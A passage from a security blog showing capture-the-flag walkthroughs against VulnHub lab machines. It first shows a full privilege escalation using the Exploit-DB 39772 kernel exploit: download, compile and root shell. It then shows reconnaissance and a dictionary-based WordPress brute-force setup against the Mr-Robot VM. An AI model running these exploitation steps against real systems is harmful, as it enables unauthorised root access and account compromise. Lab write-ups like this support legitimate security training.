<p>After enumeration, I know the target machine is running Linux Kernel 4.4.0, so by using <code>searchsploit</code> to search any existed vulnerability to against the target machine, and lucky I found one Local Root Exploit which is <a href="https://www.exploit-db.com/exploits/39772/" title="Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit"><code>Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit</code></a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
</span><span class='line'>--2016-08-13 20:17:02--  https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
</span><span class='line'>Resolving github.com <span class="o">(</span>github.com<span class="o">)</span>... 192.30.253.113
</span><span class='line'>Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span><span class="p">|</span>192.30.253.113<span class="p">|</span>:443... connected.
</span><span class='line'>HTTP request sent, awaiting response... <span class="m">302</span> Found
</span><span class='line'>Location: https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip <span class="o">[</span>following<span class="o">]</span>
</span><span class='line'>--2016-08-13 20:17:03--  https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip
</span><span class='line'>Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 151.101.100.133
</span><span class='line'>Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span><span class="p">|</span>151.101.100.133<span class="p">|</span>:443... connected.
</span><span class='line'>HTTP request sent, awaiting response... <span class="m">200</span> OK
</span><span class='line'>Length: <span class="m">7115</span> <span class="o">(</span>6.9K<span class="o">)</span> <span class="o">[</span>application/zip<span class="o">]</span>
</span><span class='line'>Saving to: <span class="s1">&#39;39772.zip&#39;</span>
</span><span class='line'>
</span><span class='line'>     0K ......                                                100% 14.5M<span class="o">=</span>0s
</span><span class='line'>
</span><span class='line'>2016-08-13 20:17:03 <span class="o">(</span>14.5 MB/s<span class="o">)</span> - <span class="s1">&#39;39772.zip&#39;</span> saved <span class="o">[</span>7115/7115<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>unzip 39772.zip
</span><span class='line'>Archive:  39772.zip
</span><span class='line'>   creating: 39772/
</span><span class='line'>  inflating: 39772/.DS_Store
</span><span class='line'>   creating: __MACOSX/
</span><span class='line'>   creating: __MACOSX/39772/
</span><span class='line'>  inflating: __MACOSX/39772/._.DS_Store
</span><span class='line'>  inflating: 39772/crasher.tar
</span><span class='line'>  inflating: __MACOSX/39772/._crasher.tar
</span><span class='line'>  inflating: 39772/exploit.tar
</span><span class='line'>  inflating: __MACOSX/39772/._exploit.tar
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>39772
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>crasher.tar
</span><span class='line'>exploit.tar
</span><span class='line'><span class="nv">$ </span>tar vxf exploit.tar
</span><span class='line'>ebpf_mapfd_doubleput_exploit/
</span><span class='line'>ebpf_mapfd_doubleput_exploit/hello.c
</span><span class='line'>ebpf_mapfd_doubleput_exploit/suidhelper.c
</span><span class='line'>ebpf_mapfd_doubleput_exploit/compile.sh
</span><span class='line'>ebpf_mapfd_doubleput_exploit/doubleput.c
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>ebpf_mapfd_doubleput_exploit
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>compile.sh
</span><span class='line'>doubleput.c
</span><span class='line'>hello.c
</span><span class='line'>suidhelper.c
</span><span class='line'><span class="nv">$ </span>./compile.sh
</span><span class='line'>doubleput.c: In <span class="k">function</span> <span class="s1">&#39;make_setuid&#39;</span>:
</span><span class='line'>doubleput.c:91:13: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast<span class="o">]</span>
</span><span class='line'>    .insns <span class="o">=</span> <span class="o">(</span>__aligned_u64<span class="o">)</span> insns,
</span><span class='line'>             ^
</span><span class='line'>doubleput.c:92:15: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast<span class="o">]</span>
</span><span class='line'>    .license <span class="o">=</span> <span class="o">(</span>__aligned_u64<span class="o">)</span><span class="s2">&quot;&quot;</span>
</span><span class='line'>               ^
</span><span class='line'><span class="nv">$ </span>ls -la
</span><span class='line'>total 60
</span><span class='line'>drwxr-x--- <span class="m">2</span> www-data www-data  <span class="m">4096</span> Aug <span class="m">13</span> 20:18 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> www-data www-data  <span class="m">4096</span> Aug <span class="m">13</span> 20:17 ..
</span><span class='line'>-rwxr-x--- <span class="m">1</span> www-data www-data   <span class="m">155</span> Apr <span class="m">25</span> 23:25 compile.sh
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data <span class="m">12332</span> Aug <span class="m">13</span> 20:18 doubleput
</span><span class='line'>-rw-r----- <span class="m">1</span> www-data www-data  <span class="m">4188</span> Apr <span class="m">25</span> 23:25 doubleput.c
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data  <span class="m">8024</span> Aug <span class="m">13</span> 20:18 hello
</span><span class='line'>-rw-r----- <span class="m">1</span> www-data www-data  <span class="m">2186</span> Apr <span class="m">25</span> 23:25 hello.c
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data  <span class="m">7520</span> Aug <span class="m">13</span> 20:18 suidhelper
</span><span class='line'>-rw-r----- <span class="m">1</span> www-data www-data   <span class="m">255</span> Apr <span class="m">25</span> 23:25 suidhelper.c
</span><span class='line'><span class="nv">$ </span>./doubleput
</span><span class='line'>starting writev
</span><span class='line'>woohoo, got pointer reuse
</span><span class='line'>id
</span><span class='line'>writev returned successfully. <span class="k">if</span> this worked, you<span class="s1">&#39;ll have a root shell in &lt;=60 seconds.</span>
</span><span class='line'><span class="s1">suid file detected, launching rootshell...</span>
</span><span class='line'><span class="s1">we have root privs now...</span>
</span><span class='line'><span class="s1">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span>
</span><span class='line'><span class="s1">id</span>
</span><span class='line'><span class="s1">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span>
</span><span class='line'><span class="s1">python -c &quot;import pty; pty.spawn(&#39;</span>/bin/bash<span class="err">&#39;</span><span class="o">)</span><span class="p">;</span><span class="err">&quot;</span>
</span><span class='line'>root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit#
</span></code></pre></td></tr></table></div></figure>


<p>Brilliant! we now got ROOT and caught the flag file under directory <code>/root/</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@red:/root# ls
</span><span class='line'>ls
</span><span class='line'>fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
</span><span class='line'>root@red:/root# cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>~~~~~~~~~~&lt;<span class="o">(</span>Congratulations<span class="o">)</span>&gt;~~~~~~~~~~
</span><span class='line'>                          .-<span class="s1">&#39;&#39;&#39;&#39;&#39;-.</span>
</span><span class='line'><span class="s1">                          |&#39;</span>-----<span class="s1">&#39;|</span>
</span><span class='line'><span class="s1">                          |-.....-|</span>
</span><span class='line'><span class="s1">                          |       |</span>
</span><span class='line'><span class="s1">                          |       |</span>
</span><span class='line'><span class="s1">         _,._             |       |</span>
</span><span class='line'><span class="s1">    __.o`   o`&quot;-.         |       |</span>
</span><span class='line'><span class="s1"> .-O o `&quot;-.o   O )_,._    |       |</span>
</span><span class='line'><span class="s1">( o   O  o )--.-&quot;`O   o&quot;-.`&#39;</span>-----<span class="s1">&#39;`</span>
</span><span class='line'><span class="s1"> &#39;</span>--------<span class="err">&#39;</span>  <span class="o">(</span>   o  O    o<span class="o">)</span>
</span><span class='line'>              <span class="sb">`</span>----------<span class="sb">`</span>
</span><span class='line'>b6b545dc11b7a270f4bad23432190c75162c4a2b
</span><span class='line'>
</span><span class='line'>root@red:/root#
</span></code></pre></td></tr></table></div></figure>




<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Mr-Robot: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/"/>
    <updated>2016-08-10T20:46:39+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1</id>
    <content type="html"><![CDATA[<p>&ldquo;Based on the show, Mr. Robot. This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. The VM isn&rsquo;t too difficult. There isn&rsquo;t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/jason,292/">Jason</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Mr-Robot: 1 (<em>10.1.1.137/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li><code>robot.txt</code> sensitive information disclosure</li>
<li><code>WordPress</code> username and password bruteforce attack</li>
<li>Exploit Old NMAP <code>--interactive</code> privilege escalation vulnerability to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Scan specific vulnerability for WordPress CMS [<font color="FF8000">wpscan</font>]</li>
<li>Exploit WordPress administrator/editor account to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability (<code>old NMAP --interactive</code> vulnerability) to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://wpscan.org/">wpscan</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.137    00:0c:29:61:51:fa   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:f3:e7:2a   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 3.021 seconds <span class="o">(</span>84.74 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.137</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.137/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-08-05 12:37:00 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.137
</span><span class='line'>Discovered open port 443/tcp on 10.1.1.137
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.137
</span><span class='line'>Host is up <span class="o">(</span>0.0037s latency<span class="o">)</span>.
</span><span class='line'>PORT    STATE SERVICE  VERSION
</span><span class='line'>80/tcp  open  http     Apache httpd
</span><span class='line'><span class="p">|</span>_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>_http-server-header: Apache
</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="s1">&#39;t have a title (text/html).</span>
</span><span class='line'><span class="s1">443/tcp open  ssl/http Apache httpd</span>
</span><span class='line'><span class="s1">|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E</span>
</span><span class='line'><span class="s1">| http-methods: </span>
</span><span class='line'><span class="s1">|_  Supported Methods: GET HEAD POST OPTIONS</span>
</span><span class='line'><span class="s1">|_http-server-header: Apache</span>
</span><span class='line'><span class="s1">|_http-title: Site doesn&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.example.com
</span><span class='line'><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>www.example.com
</span><span class='line'><span class="p">|</span> Public Key <span class="nb">type</span>: rsa
</span><span class='line'><span class="p">|</span> Public Key bits: 1024
</span><span class='line'><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
</span><span class='line'><span class="p">|</span> Not valid before: 2015-09-16T10:45:03
</span><span class='line'><span class="p">|</span> Not valid after:  2025-09-13T10:45:03
</span><span class='line'><span class="p">|</span> MD5:   3c16 3b19 87c3 42ad <span class="m">6634</span> c1c9 d0aa fb97
</span><span class='line'><span class="p">|</span>_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
</span><span class='line'>MAC Address: 00:0C:29:61:51:FA <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span><span class='line'>OS details: Linux 3.10 - 3.19, Linux 3.2 - 4.0
</span><span class='line'>Uptime guess: 0.000 days <span class="o">(</span>since Fri Aug  <span class="m">5</span> 08:38:08 2016<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Only port <code>80</code> and <code>443</code> is found and <code>Apache</code> is the HTTP server.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port <code>80</code> found by port-scanning stage.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.137
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.5.29
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;tcn&#39;</span> found, with contents: list
</span><span class='line'>+ GET Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id<span class="o">=</span>4698ebdc59d15. The following alternatives <span class="k">for</span> <span class="s1">&#39;index&#39;</span> were found: index.html, index.php
</span><span class='line'>+ OSVDB-3092: GET /admin/: This might be interesting...
</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;link&#39;</span> found, with contents: &lt;http://10.1.1.137/?p<span class="o">=</span>23&gt;<span class="p">;</span> <span class="nv">rel</span><span class="o">=</span>shortlink
</span><span class='line'>+ GET /readme.html: This WordPress file reveals the installed version.
</span><span class='line'>+ GET /wp-links-opml.php: This WordPress script reveals the installed version.
</span><span class='line'>+ OSVDB-3092: GET /license.txt: License file found may identify site software.
</span><span class='line'>+ GET /admin/index.html: Admin login page/section found.
</span><span class='line'>+ GET Cookie wordpress_test_cookie created without the httponly flag
</span><span class='line'>+ GET /wp-login/: Admin login page/section found.
</span><span class='line'>+ GET /wordpress/: A Wordpress installation was found.
</span><span class='line'>+ GET /wp-admin/wp-login.php: Wordpress login found
</span><span class='line'>+ GET /blog/wp-login.php: Wordpress login found
</span><span class='line'>+ GET /wp-login.php: Wordpress login found
</span></code></pre></td></tr></table></div></figure>


<p><code>WordPress CMS</code> is found, also <code>/robots.txt</code> and <code>/license.txt</code> are found.</p>

<p>So I run <code>wpscan</code> to scan this WordPress CMS, and in the mean time, I go have a look at the two interesting files.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# wpscan --url 10.1.1.137
</span><span class='line'>_______________________________________________________________
</span><span class='line'>        __          _______   _____
</span><span class='line'>        <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
</span><span class='line'>         <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __
</span><span class='line'>          <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="s1">&#39;_ \ </span>
</span><span class='line'><span class="s1">           \  /\  /  | |     ____) | (__| (_| | | | |</span>
</span><span class='line'><span class="s1">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>
</span><span class='line'>
</span><span class='line'><span class="s1">        WordPress Security Scanner by the WPScan Team </span>
</span><span class='line'><span class="s1">                       Version 2.8</span>
</span><span class='line'><span class="s1">          Sponsored by Sucuri - https://sucuri.net</span>
</span><span class='line'><span class="s1">   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_</span>
</span><span class='line'><span class="s1">_______________________________________________________________</span>
</span><span class='line'>
</span><span class='line'><span class="s1">[i] It seems like you have not updated the database for some time.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">[+] URL: http://10.1.1.137/</span>
</span><span class='line'><span class="s1">[+] Started: Fri Aug  5 23:16:00 2016</span>
</span><span class='line'>
</span><span class='line'><span class="s1">[+] robots.txt available under: &#39;</span>http://10.1.1.137/robots.txt<span class="s1">&#39;</span>
</span><span class='line'><span class="s1">[!] The WordPress &#39;</span>http://10.1.1.137/readme.html<span class="err">&#39;</span> file exists exposing a version number
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: SERVER: Apache
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> XML-RPC Interface available under: http://10.1.1.137/xmlrpc.php
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> WordPress version 4.3.5 identified from rss generator
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Enumerating plugins from passive detection ...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> No plugins found
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished: Fri Aug  <span class="m">5</span> 23:16:01 2016
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Requests Done: 48
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Memory used: 7.668 MB
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Elapsed <span class="nb">time</span>: 00:00:00
</span></code></pre></td></tr></table></div></figure>


<p>From the <code>wpscan</code> result, there is nothing special information. But from the robot file <code>/robots.txt</code>, I got the 1st flag!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>User-agent: *
</span><span class='line'>fsocity.dic
</span><span class='line'>key-1-of-3.txt
</span></code></pre></td></tr></table></div></figure>


<p>The first key found in the file <code>key-1-of-3.txt</code>: <font color='red'><code>073403c8a58a1f80d943455fb30724b9</code></font></p>

<p>And I got a dictionary file <code>fsocity.dic</code> as well.</p>

<p>Highly believed that I can brute force username / password by using this dictionary file, and I filtered it to include the strings which only between 4-8 digitals.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# grep -E <span class="s1">&#39;^[a-zA-Z]&#39;</span> fsociety.dic <span class="p">|</span> sort -u <span class="p">|</span>  awk <span class="s1">&#39;length($1) &lt;=8 &amp;&amp; length($1) &gt;= 4 { print $1}&#39;</span> &gt; users.txt
</span><span class='line'>root@kali:~/mrRobot# ls -l
</span><span class='line'>total 7124
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root    <span class="m">1546</span> Aug  <span class="m">5</span> 08:48 10.1.1.137_nikto.txt
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root    <span class="m">1845</span> Aug  <span class="m">5</span> 08:38 10.1.1.137_nmap.txt
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">7245381</span> Aug  <span class="m">5</span> 23:49 fsociety.dic
